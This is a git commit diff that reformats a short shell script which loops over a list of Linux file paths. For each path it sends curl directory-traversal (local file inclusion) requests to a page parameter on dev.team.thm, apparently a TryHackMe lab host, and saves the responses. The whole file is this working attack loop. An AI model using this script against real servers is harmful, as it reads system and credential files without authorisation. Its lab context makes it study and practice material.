f1b8a8f65f712d3d5077d5a15396056da09a1466
hazeyez <90569746+hazeyez@users.noreply.github.com>
2022-05-08 01:05:03 -0400

    Update LFI-Dir_Traversal_v1.sh

--- LFI-Dir_Traversal_v1.sh
+++ LFI-Dir_Traversal_v1.sh
@@ -3,7 +3,6 @@ filename='linux-paths.txt'
 
 while read line  
 do 
-echo "[+] Trying $line"
-curl http://dev.team.thm/script.php\?page\=../../../../../../../../$line > result.txt
-
+ echo "[+] Trying $line"
+ curl http://dev.team.thm/script.php\?page\=../../../../../../../../$line > result.txt
 done < $filename
